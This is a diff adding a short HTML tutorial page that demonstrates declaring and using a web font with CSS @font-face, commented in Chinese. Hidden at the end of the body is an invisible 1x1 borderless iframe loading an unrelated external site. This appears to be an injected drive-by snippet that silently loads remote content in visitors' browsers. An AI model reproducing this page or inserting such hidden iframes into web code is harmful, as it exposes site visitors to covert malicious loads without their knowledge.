@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head lang="en">
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+
+        p{
+            font-size:30px;
+        }
+
+        /*  如果要在网页中使用web字体（用户电脑上没有这种字体），*/
+        /* 声明字体*/
+        /* 告诉浏览器 去哪找这个字体*/
+        @font-face {font-family: 'webfont';
+            src: url('font/webfont.eot'); /* IE9*/
+            src: url('font/webfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
+            url('font/webfont.woff') format('woff'), /* chrome、firefox */
+            url('font/webfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
+            url('font/webfont.svg#webfont') format('svg'); /* iOS 4.1- */
+        }
+        /* 定义一个类名，谁加这类名，就会使用webfont字体*/
+        .webfont{
+            font-family: 'webfont';
+        }
+    </style>
+</head>
+<body>
+    <p class="webfont">苍茫的天涯我的爱...</p>
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
